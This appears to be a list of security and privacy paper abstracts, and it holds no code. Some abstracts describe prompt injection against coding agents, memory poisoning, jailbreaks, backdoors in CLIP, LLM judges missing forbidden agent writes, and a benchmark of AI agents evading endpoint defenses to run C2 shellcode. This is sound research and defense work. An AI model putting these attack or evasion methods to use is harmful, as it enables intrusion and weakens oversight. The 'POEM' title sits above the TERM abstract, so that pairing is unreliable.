summary: Data spaces like the European Health Data Space (EHDS) require the protection of sensitive data in studies during the data's processing and the study's release alike. In this work, we investigate how to implement this mandate using established trusted execution environments (TEEs) and timing side-channel hardening to protect the processing even under a compromised server, and the state-of-the-art differential privacy (DP) notion to protect the release of studies on tabular data. This combined setup could seem to complete the picture, but in fact raises unexpected security challenges that we mitigate by introducing MammothDP: a significant milestone towards a holistic machine learning system based on the recent gradient boosted decision tree learner S-BDT that is provably DP if used within a privacy filter, timing side-channel hardened, and deployed on a TEE. To achieve a strong privacy-utility tradeoff, we introduce two novel components: an early stopping criterion that adaptively selects the number of trees without any privacy overhead, and an improved rollback protection that is no longer vulnerable under timing side-channel attacks.

title: Location Matters: Sparse Latent-Variance Attacks for Face Privacy against Diffusion Personalization
summary: Text-to-image diffusion models can learn and reproduce an individual's identity from only a few reference photos, creating risks of unauthorized and misleading content generation. Proactive defenses address this risk by adding adversarial perturbations to facial images before release, thereby disrupting identity acquisition during downstream personalization. However, existing methods typically rely on dense $L_\infty$-bounded perturbations, whose accumulated distortions can become visible around facial structures. Recent methods improve protected-image quality, but often at the cost of reduced protection effectiveness. In this paper, we propose Sparse Encoder Attack on Latent Variance (SEAL), a sparse adversarial protection framework that modifies only 5% of the spatial locations in a facial image. SEAL combines a differentiable top-k masking scheme that jointly optimizes perturbation locations and values with a variance-oriented objective over the frozen VAE encoder's latent distribution to disrupt identity-consistent representations. A saliency-guided dispersion penalty further discourages perturbation concentration in perceptually salient facial regions. Experiments on CelebA-HQ and VGGFace2 show that SEAL achieves the best protected-image quality among the compared methods, exceeding 41 dB PSNR with 0.97 SSIM and at most 0.07 LPIPS, while reducing identity similarity to at most 0.15 after diffusion personalization. These results demonstrate that sparse location optimization enables strong identity protection while preserving high visual quality. Code and data are available at https://github.com/Lvxan/SEAL

title: Model-Based Authoring of SOC Simulation Exercises for Cybersecurity Education
summary: Cybersecurity training and classroom exercises with a virtual Security Operations Center (SOC) combine alerts, evidence, timeline entries, learner tasks, and assessment items that must remain consistent across an evolving incident. This paper presents a model-based authoring method in which a technical and educational specification is used to construct an incident exercise model and a large language model (LLM) generates selected scenario text based on that model. The incident exercise model combines an incident model of events, objects, and evidence with an exercise orchestration model of SOC alerts, timeline entries, learner tasks, and assessment items. The method is implemented in a Virtual SOC prototype and evaluated using a phishing-to-ransomware reference exercise. Its incident exercise model contains eight incident events, eight incident objects, six evidence items, seven alerts in five batches, 13 timeline entries including 12 learner tasks, and five representative assessment items. GLM-5.3-generated alert descriptions are inserted and a separate validator checks references, ordering, evidence links, assessment completeness, and selected fixed fields. Validation is demonstrated with reference data, resulting in true-negative outcomes for valid data and true-positive outcomes for deliberately placed inconsistencies. The resulting exercise package is executable within the Virtual SOC learner environment. Overall, the evaluation indicates consistency across the involved model elements and establishes the feasibility of the model-based and generative approach.

title: An Empirical Study on CVE-based Vulnerabilities Propagation from one System to another System (IntraProject vs InterProject)
summary: Vulnerabilities in applications, including browsers, media players, online services and document readers, etc. are often exploited and cause a serious damage. The vulnerabilities could exist in your system maybe because of some coding errors, design oversights, outdated software, AI generated codes or maybe transferred from another system during development (e.g., code clones). The propagation of software vulnerabilities is a critical concern in cybersecurity. This study examines the root cause problem of vulnerabilities propagation with experiments. We analyzed the propagation of CVE (Common Vulnerabilities and Exposures) based vulnerabilities within and between different software projects (IntraProject vs. InterProject). We performed several experiments on CVE based vulnerability dataset (retrieved from NVD source) by using our vulnerability detection tool (SQVDT). In the results, we discovered similar patterns of vulnerable code in several very famous recently used software, including latest version of Linux, Android operating systems, and in thousands of open source projects available on GitHub. We found several very high severity level (CVSS) vulnerabilities that propagated from one system to another system, just because of copy/paste (reuse) the code. Furthermore, we performed an empirical evaluation and verification of these vulnerable patterns that propagated to other systems by also considering the frequency of their propagation. Finlay, we recommended the impact of these vulnerabilities propagation on the interconnected systems.

title: Secure Information Flow in Quantum Programs
summary:
Information-flow security aims to prevent the leakage of confidential information through program execution. This problem becomes fundamentally subtler for quantum programs, because their states may involve superposition and entanglement, and their executions may involve intricate interactions between classical and quantum variables. This paper develops semantic foundations and verification methods for secure information flow in quantum programs. We formulate two notions of information-flow security. The first is a noninterference-based definition that naturally generalizes its classical counterpart. The second is a simulation-based definition that explicitly models an attacker, providing a clear operational interpretation of security. We prove that these two notions are equivalent.
  To verify the information-flow security of quantum programs, we develop a proof framework based on quantum Hoare logic. A key challenge is that the standard self-composition technique, which expresses information-flow security in Hoare logic by composing a program with a renamed copy of itself, fails in the quantum setting due to an obstruction analogous to the no-cloning theorem. To overcome this challenge, we introduce self-conjugation, a novel technique that leverages the deferred measurement principle and properties of unitary operations. We demonstrate our framework on examples drawn from the quantum one-time pad, quantum error correction, and anonymous entanglement generation.

title: GARD: Gradient-Guided Adversarial Representation Defense against Backdoors in Multimodal Contrastive Learning Models
summary: Multimodal contrastive learning models such as CLIP are vulnerable to backdoor attacks with diverse trigger structures, ranging from localized patches to globally distributed perturbations, with recent attacks increasingly optimizing these triggers in the representation space. Existing post-hoc defenses based on clean fine-tuning may leave backdoors active, while trigger-inversion methods depend on accurately estimating the attack target and trigger. We observe that backdoored encoders exhibit structure-dependent representation sensitivity: global perturbations preferentially expose distributed backdoors, whereas local patch perturbations are more effective for localized backdoors. Based on this observation, we propose Gradient-Guided Adversarial Representation Defense (GARD), a target- and trigger-agnostic post-hoc defense. GARD optimizes complementary global and local adversarial probes to maximally displace clean-image representations, and then realigns the perturbed representations with detached clean anchors while preserving image-text alignment. The resulting model requires no additional computation at inference time. Across six visual backdoor attacks and two CLIP visual backbones, GARD reduces the attack success rate below 1% in all 12 evaluated attack-backbone combinations while maintaining competitive clean accuracy. These results demonstrate the effectiveness of adversarial representation probing for repairing backdoored multimodal contrastive encoders.

title: Sable: A Small-Field Sumcheck Argument for Bit-Exact Inference of Large Language Models
summary: We present Sable, an argument system and single-GPU prover for the statement that a committed, integer-quantized transformer produced a given token sequence from a given prompt, bit for bit. Sable fixes an integer function F_O with no floating-point step, in which every rounding, normalization, softmax and sampling decision is determined by its inputs, and proves it with a constraint system whose relations provably never wrap modulo the 31-bit KoalaBear prime. The proof batches zerochecks and LogUp-GKR lookups into one sumcheck per domain, and commits to every witness tensor and weight in one multilinear commitment built from Reed-Solomon codes, BLAKE3 Merkle trees and a mixed-length BaseFold opening. The prover streams the model layer by layer on one GPU. On one NVIDIA RTX PRO 6000 Blackwell GPU, Sable proves all 64 layers of Qwen2.5-32B in 92.5 s for 4,096 tokens and 398 s for 16,384 tokens, and covers Qwen3-32B and the mixture-of-experts Qwen3-30B-A3B (4,096 tokens in 121.8 and 84.7 s). A proof costs 41 to 50 times the serving time, or 6.4 cents per 4,096-token request at public GPU prices, and 40 to 64 times less time per parameter and token than zkLLM. On WikiText-2, F_O's greedy token matches the BF16 model's at 86.3% of positions; on Qwen3, F_O is within 1.6 points of BF16 on MMLU and 1.7 points on GSM8K. A verifier with a compiled core checks a proof on one CPU core in 19 to 56 s. In the random-oracle model, the interactive proof has round-by-round soundness error 2^-103. The proof is not zero-knowledge, so the system targets open-weight models. Code: https://github.com/moonmath-ai/Sable

title: What a CAGE 4 Score Measures: An Audit of a Learned Cyber-Defense Benchmark, Its Reference Defenders, and the Tables Built on Them
summary: CAGE Challenge 4 is the benchmark on which learned multi-agent cyber defenders are compared. We reproduce its two reference defenders, KEEP and H-MARL Expert, in a pinned container and show that three things read from it measure less than they are taken to measure. First, the simulator silently discards any action asserted for an agent whose previous action is still running, and charges one point for a discarded Restore as for one that runs. The documented observation does not expose the busy flag. Both reference defenders read it in their own wrappers, and switching that check off at evaluation costs KEEP's released policy 99.58 points per episode and H-MARL's 145.98, in both cases the charge for Restores sent to busy agents, with H-MARL's executed actions unchanged step for step. On a supervisory harness, holding interventions until the agent is idle is worth 25.3 and 27.6 points per episode at the published setting. In training, the check decides how a busy step enters the trajectory. Trained without it, KEEP leads at a hundred updates in all four paired seeds and trails from two hundred on in all four. Continued to two thousand updates on three seeds, the repaired recipe ends inside the released interval on one seed and short on two, by 27 and 125 points, a spread across training seeds far wider than the released reproduction interval. Second, the evaluation seeds the environment but not the policy, so a reported mean is one draw, and 88.9% of per-episode outcome variance is the policy's own sampling draw. Third, recovery precision depends on the truth it is scored against. Across five published comparison tables, none states the artifact, sampling, criterion and adversary that would make its numbers comparable. We release the instrument, our patches to both defenders, the traces and checkpoints behind every number, and a five-item disclosure checklist.

title: Isolation Is Not Confidentiality: Security Boundaries of Geometric Access Control in RAG
summary:
Retrieval-Augmented Generation (RAG) systems increasingly rely on vector databases containing documents governed by different access-control policies. Recent search-preserving geometric approaches enforce such access control by structuring the embedding space so that transformed embeddings, which we call protected representations, remain retrievable without exposing information across policy boundaries.
  We provide a unified security analysis of this paradigm, covering policy isolation, representation confidentiality, query forgery resistance, and policy-membership hiding. We consider both a curious cloud service provider observing the protected representations stored in the vector database and a curious user holding aligned pairs of original embeddings and protected representations. Evaluating the available implementations of the works proposing these geometric transformation mechanisms across three encoders, we find that geometric transformations preserve retrieval utility and provide strong policy isolation, but do not provide the other security properties. A curious user can recover the original embeddings from a few hundred pairs and forge policy-compatible queries at a higher cost that grows with encoder dimension for secret per-policy transformations. Moreover, policy-dependent geometry can leak policy membership even when unauthorized retrieval is prevented. These results show that policy isolation, confidentiality, forgery resistance, and membership hiding are distinct security objectives.

title: Pulse or Provenance? What rPPG-Based Deepfake Detectors Learn
summary: Remote photoplethysmography (rPPG) has been proposed as a physiological cue for deepfake detection, based on the premise that synthesized faces lack a genuine cardiac signal. We examine what rPPG-style detectors learn on Celeb-DF++ (22 forgery methods) and FaceForensics++ (FF++), using one identically sampled window per real and fake video. On talking-face forgeries, simple chrominance traces reach an AUC of 0.998, exceeding a dedicated rPPG extractor (0.87). Controlled experiments indicate that this signal is not physiological in origin. On fully synthesized forgeries, it is equally discriminative when extracted from background regions or from full frames without face detection, and it is concentrated above the 0.7 to 4 Hz heart-rate band. It is largely removed by shuffling frame order but persists after normalizing resolution, frame rate and encoding, and an independent reimplementation reproduces these findings. Removing high-frequency content makes most synthesized videos appear real, adding it makes real videos appear fake, and injecting a synthetic pulse has little effect. In controlled self-reenactment experiments with two generators, animating a face from a single frame introduces the same high-frequency signal, whereas reconstructing each frame from its own source does not. Face-based chrominance detectors trained on Celeb-DF++ classify over 99% of real FF++ videos as fake, indicating that they largely encode video source rather than manipulation, and a CLIP-based detector exhibits the same behavior. A frozen CLIP backbone matches or exceeds fusions of CLIP with rPPG and frequency features. Finally, we show that the official Celeb-DF and Celeb-DF++ splits share identities and source-video content between training and test, and that custom protocols reusing test videos and identities in training inflate weaker detectors by up to 0.30 AUC.

title: Gradient Inversion through Linear and Affine Subspace Constraints
summary: Federated learning enables multiple clients to collaboratively train a machine-learning model without directly sharing their local datasets. However, as prior works have shown, the gradients exchanged during training may reveal sensitive information about client data. Most existing attacks usually optimize dummy inputs to match the true client gradients (Gradient Inversion Attacks), while some attempt to reconstruct them based on the observation that aggregate gradients from a fully connected (FC) layer are a linear combination of its inputs. In this work, we extend this observation by showing that aggregate gradients from an FC layer with the correct scaling are actually an affine combination of its inputs. We evaluate a gradient inversion attack that leverages either known linear-subspace information or its affine-subspace counterpart at each FC layer to improve reconstruction accuracy. Our results show that subspace-based methods can substantially improve reconstruction quality over the chosen baselines in certain settings. We further demonstrate that moderate overestimation of the batch size can generally improve or preserve reconstruction quality, even when the true batch size is unknown. We additionally examine reconstruction under gradient perturbations introduced by a differential privacy (DP) mechanism, providing insight into the effectiveness of the considered formulations under noisy conditions.

title: Comparing WeChat and Telegram MiniApp Security Architectures: Toward Cross-Platform Analysis
summary: MiniApps are increasingly central to super-app ecosystems, yet architectural differences complicate the transfer of security analysis techniques across platforms. Existing WeChat analyzers rely on packaged applications and platform-specific APIs, limiting their direct applicability to Telegram's web-based MiniApps. We present a qualitative comparison of WeChat Mini Programs and Telegram MiniApps, grounded in official documentation, prior research, and manual analysis of a specific Telegram Android source revision. Using a shared taxonomy of security controls, assets, and threat sources, we examine execution environments, communication paths, and trust boundaries. WeChat provides a dedicated MiniApp runtime; Telegram combines web execution with host controls. Both retain developer responsibilities for backend authentication and resource authorization. Two worked examples derive requirements for cross-platform analysis: distinguishing credential roles and validation boundaries, and associating host capabilities with concrete execution contexts and permission handlers. These findings inform future automated analysis without ranking the ecosystems by security or claiming validated vulnerability detection.

title: From Attack Surface to Defense Architecture: Compositional Security for Agentic Coding Harnesses
summary:
AI coding harnesses couple language models to shells, filesystems, and network sockets, turning the harness into an automated Living-off-the-Land (LotL) platform: once an adversary injects instructions into retrieved content, dual-use binaries such as bash, curl, and find become the payload. We argue that security in agentic systems is a structural property of the cognitive architecture and permission composition rather than an emergent property of individual models. Static regex blacklists miss structural evasions, whereas LLM-as-a-Judge guardrails incur high latency while over-blocking benign work.
  We present ActiveSecHarness, a neurosymbolic reference-monitor architecture built around Separation of Intelligence and Authority. It combines (1) Macaroon-inspired HMAC capability tokens across four Trust and Authority Rings, (2) a 2D product taint lattice $\mathcal{L} = \mathcal{L}_{\mathrm{trust}} \times \mathcal{L}_{\mathrm{sens}}$ and a workspace provenance ledger that prevents secret laundering across disk, (3) deterministic Ring-0 OS/tool guards, and (4) bytecode certificates, split-horizon audit logs, self-healing security test synthesis, and an adaptive UserWikiManager.
  Across $N=252$ fixtures ($120$ attack, $120$ benign, $12$ kill chains), a live local LLM judge (qwen3:4b) refuses $98.3\%$ of benign work at $142.3\,\mathrm{ms}$ latency, whereas Ring 0 achieves $\mathrm{ABR}=1.000$ and $\mathrm{FPR}=0.000$ in $12.7\,μ\mathrm{s}$ ($11{,}200\times$ faster). In a multi-step trajectory ablation, an oracle Conseca-style stateless policy misses $4/12$ kill chains ($\mathrm{ABR}=0.667$) and coarse Boolean taint blocks $83.3\%$ of benign workflows, while our 2D product lattice achieves $\mathrm{ABR}=1.000$ and $\mathrm{FPR}=0.000$ at $\approx 20\,μ\mathrm{s}$ per step.

title: Data4Cyber: Labeled Cyber-Physical Datasets for Distribution-Grid Management Systems Under Representative OT Attacks
summary: Cyberattacks against power systems increasingly exploit industrial communication and control dependencies arising from distributed energy resources (DER), remote management, and market-based incentives. Progress on intrusion detection is constrained by a lack of public datasets that align operational technology (OT) network telemetry with physical measurements and control context. Data4Cyber is a labeled cyber-physical dataset recorded in a laboratory distribution management system (DMS) for self-consumption optimization with photovoltaic generation, battery storage, controllable loads, and substation metering. It captures synchronized process measurements, controller context, price incentives, and packet captures (Modbus/TCP and MQTT) across one benign baseline and six attack scenarios spanning protocol-semantic Modbus manipulation, man-in-the-middle (MitM) false-data injection, and MQTT price manipulation. Its fixed 1 s time base, phase-resolved labels, and state-oriented representation support temporally blocked stateful-detector evaluation. Baseline results show that high recall alone is insufficient: several detectors achieve sensitivity through alarm saturation. Context-driven attacks require process-aware interpretation rather than single-channel thresholding.

title: Domain-Invariant and Language-Model-Assisted Acoustic Side-Channel Attacks on Keyboards
summary: Acoustic side-channel attacks (ASCA) recover typed text from the sound of keystrokes, using only a commodity microphone and no access to the victim's device. Prior work establishes that such attacks succeed under idealized laboratory conditions - a single keyboard, a fixed microphone, a quiet room, and training and testing on the same device but leaves open the question that matters for security: whether keystroke inference survives the open world of unseen keyboards, diverse users, noisy environments, and compressed transmission channels. The answer developed here is that it does, provided the acoustic model is made explicitly domain-invariant and its noisy predictions are corrected by a language model.

title: Adversarial Risk in the Generative AI Era Necessitates Dropping the Small Epsilon Ball
summary: Adversarial Machine Learning research is currently centered on the search for the epsilon-ball: minimal perturbations designed to fool models while remaining imperceptible to humans. We argue that this fixation on $\ell_p$ norms is a metrological trap that communicates a distorted perception of risk to defenders, one that is unaligned with real-world system vulnerabilities. This paradigm misleads defenders into optimizing for narrow, mathematical robustness at the expense of systemic security, while simultaneously incentivizing attackers to exploit non-overlapping alternative adversarial pathways. Ultimately, we argue that the dominance of the $\ell_p$ ball does not just fail to reduce harm---it may actively facilitate it by communicating a false sense of security against the wrong threats.

title: On Private Knowledge Retrieval and Private Inference for secure multi-agent systems
summary:
Multi-agent systems provide a convenient framework for the massive deployment of agents based on Large Language Models (LLMs). It provides a sound framework where agents can interact with existing software to perform actions in an autonomous way. Agentic AI is the new term to denote these AI-based autonomous systems.
  In real multi-agent systems, agents need to deal with malicious agents some of which can exploit security vulnerabilities to do harm. A memory poisoning attack is an example of exploiting a vulnerability to modify agents knowledge and, thus, affect its behavior. In an agent, there are different types of memory systems (semantic, episodic, and short-term) which have their own characteristics and for which different memory poisoning attacks may be developed.
  In this paper we focus on semantic memory, we discuss its attack, and mitigation strategies. We introduce private knowledge retrieval and private inference. We propose a signature system in the knowledge base to prevent from undesired manipulation. This should avoid memory poisoning attacks by introducing security by design in the construction of the semantic memory. In our architecture, an agent contains a local Prolog-like inference system (i.e., using Horn clauses to represent knowledge) which accesses an external knowledge base to get the required knowledge. This externally signed knowledge base is accessed privately. We provide different implementations in Python using different privacy levels including k-anonymity and information-theoretical privacy (IT-PIR).

title: BypassGym: A Benchmark for Evaluating AI Agents' Endpoint Defense Evasion Capabilities
summary: Artificial intelligence agents increasingly automate cybersecurity tasks, including offensive operations. Frequent attacks across the web make endpoint detection and response (EDR) a critical defense, but whether AI agents can evade it remains unclear. Benchmarks evaluate the offensive capabilities of large language model (LLM) agents in areas such as penetration testing and vulnerability discovery. One important capability that these benchmarks do not address is defense evasion, specifically whether an agent can develop a program that executes a payload without being blocked or terminated by a deployed EDR. We introduce BypassGym, to our knowledge the first benchmark to systematically evaluate this capability on real endpoints. Given command-and-control (C2) shellcode, an agent must generate and compile a loader that executes the payload without being blocked or terminated. A supplementary evasion knowledge skill provides domain knowledge and supports comparisons with and without this input. BypassGym is built on Proxmox VE(PVE), so the evaluation environment runs real Windows systems and EDR products inside virtual machines and returns structured detection feedback to the agent. We evaluate 5 lightweight model backends against 6 EDR products and 3 payloads, and find that even these simple models generate successful submissions, with DeepSeek-V4.1 Flash reaching 17/18 successful runs and Bitdefender allowing only 5 of 15 runs to pass. These results provide a systematic measurement of current AI agents' endpoint defense evasion capabilities and identify areas for defenders to investigate.

title: MOAI: Module-Optimizing Architecture for non-interactive secure transformer Inference
summary: Privacy concerns have been raised in Large Language Models (LLM) inference when models are deployed in Cloud Service Providers (CSP). Homomorphic encryption (HE) offers a promising solution by enabling secure inference directly over encrypted inputs. However, the high computational overhead of HE remains a major bottleneck. To address this challenge, we propose MOAI, an efficient HE-based, non-interactive framework for secure transformer inference. MOAI gains significant efficiency improvement from: (1) a novel evaluation flow that combines column and diagonal packing with consistent strategies across all layers, eliminating expensive format conversions. (2) rotation-free algorithms for Softmax and LayerNorm that significantly reduce the number of costly HE rotations, removing 2,448 HE rotations in BERT-base inference. (3) Column packing removes rotations in plaintext-ciphertext matrix multiplications and interleaved batching further reduces the rotations in ciphertext-ciphertext matrix multiplications. MOAI uses at least 1.7x fewer HE rotations compared to the state-of-the-art works across all matrix multiplications of BERT-base. As a result, we achieve a $52.8 \%$ reduction in evaluation time compared to the state-of-the-art HE-based non-interactive secure transformer inference, THOR (Moon et al., CCS 25). We then apply MOAI on the Powerformer's framework and achieve a $55.7 \%$ reduction in evaluation time compared to Powerformer (Park et al., ACL 25), which approximates Softmax and LayerNorm with simpler functions in transformer and proposes HE-based non-interactive transformer inference. We report an amortized time of 2.36 minutes per input on a single GPU environment. We show the extendibility by applying MOAI in LLaMA-3-8B. Our implementation is publicly available as open source.

title: When Evaluators of AI Agents Disagree: An Empirical Study of Native Scoring, LLM Judges, and Commit-Boundary Checks on tau2-bench
summary:
Agentic workflows, in which a large language model (LLM) calls tools to read and write data, are evaluated in two ways. Benchmarks compare the final state against a gold answer. Deployed services have none; an LLM judge reads the transcript and decides. Practice treats the two as interchangeable. This paper measures whether they are.
  We ran 2,160 episodes in tau2-bench's airline and retail domains and recorded every database write. We scored each episode four ways: native scoring against gold state, an LLM judge, that judge given the policy document, and the boundary evaluator, a minimal rule-based check of whether a write was expected against whether one occurred in the trace. Two annotators independently labeled 120 episodes for task correctness, policy compliance, and commitment correctness.
  The judge repeated its verdict 98.2% of the time but agreed with native scoring on 56.2%. In 11 episodes the agent executed a forbidden write. The judge passed 10 to 11, with or without the policy or transcript. A stronger judge still passed 6. The boundary evaluator, with no model call, caught all 11; no judge significantly exceeded it on human labels. Forbidden writes occurred in 11.1% of episodes without gates. Verification, correction, and safe-termination gates did not reduce them significantly. The traces show a candidate cause: the gates' evidence digest dropped the order status and customer authentication, so valid requests were rejected. The choice of evaluator decides the conclusion; the minimal check exposes failures the judges miss. Traces, code, prompts, and labels are released.

title: POEM: Output-Relative Block-Sparse Attention for Long-Context Prefilling
summary: Large language models (LLMs) have shown strong capabilities across diverse applications, making both safety and utility essential for reliable deployment. Jailbreak attacks use diverse forms of adversarial prompting to bypass alignment safeguards and induce LLMs to generate harmful responses. Some representation-based defenses regulate internal activations using predefined steering directions or learned safety regions. However, adapting intervention to each input without a predefined representational target while limiting over-refusal remains a challenge. In this paper, we propose Target-free Entropy-guided Residual Modulation (TERM), an inference-time defense that uses prompt-calibrated attention entropy deviations to guide adaptive modulation of the model's own residual updates. Attention patterns vary across prompts and decoding steps, making raw entropy values difficult to interpret as a consistent signal for intervention. We therefore calibrate attention entropy against each prompt's own prefill baseline to establish an input-specific reference for reducing unnecessary intervention on benign requests. Adaptive scale normalization and temporal accumulation then account for differences in deviation scale and persistence to determine intervention strength. The resulting signal controls bounded scaling of the model's own residual updates, without relying on a predefined safety direction. We compare our method with seven defenses on seven jailbreak attacks and two over-refusal benchmarks across Llama, Qwen, and Gemma models, including Qwen3 models from 0.6B to 32B. Results show our method improves jailbreak robustness while maintaining low over-refusal on benign safety-sensitive requests with modest inference overhead.

title: TERM: Target-Free Jailbreak Defense via Entropy-Guided Residual Modulation
summary: Large language models (LLMs) have shown strong capabilities across diverse applications, making both safety and utility essential for reliable deployment. Jailbreak attacks use diverse forms of adversarial prompting to bypass alignment safeguards and induce LLMs to generate harmful responses. Some representation-based defenses regulate internal activations using predefined steering directions or learned safety regions. However, adapting intervention to each input without a predefined representational target while limiting over-refusal remains a challenge. In this paper, we propose Target-free Entropy-guided Residual Modulation (TERM), an inference-time defense that uses prompt-calibrated attention entropy deviations to guide adaptive modulation of the model's own residual updates. Attention patterns vary across prompts and decoding steps, making raw entropy values difficult to interpret as a consistent signal for intervention. We therefore calibrate attention entropy against each prompt's own prefill baseline to establish an input-specific reference for reducing unnecessary intervention on benign requests. Adaptive scale normalization and temporal accumulation then account for differences in deviation scale and persistence to determine intervention strength. The resulting signal controls bounded scaling of the model's own residual updates, without relying on a predefined safety direction. We compare our method with seven defenses on seven jailbreak attacks and two over-refusal benchmarks across Llama, Qwen, and Gemma models, including Qwen3 models from 0.6B to 32B.
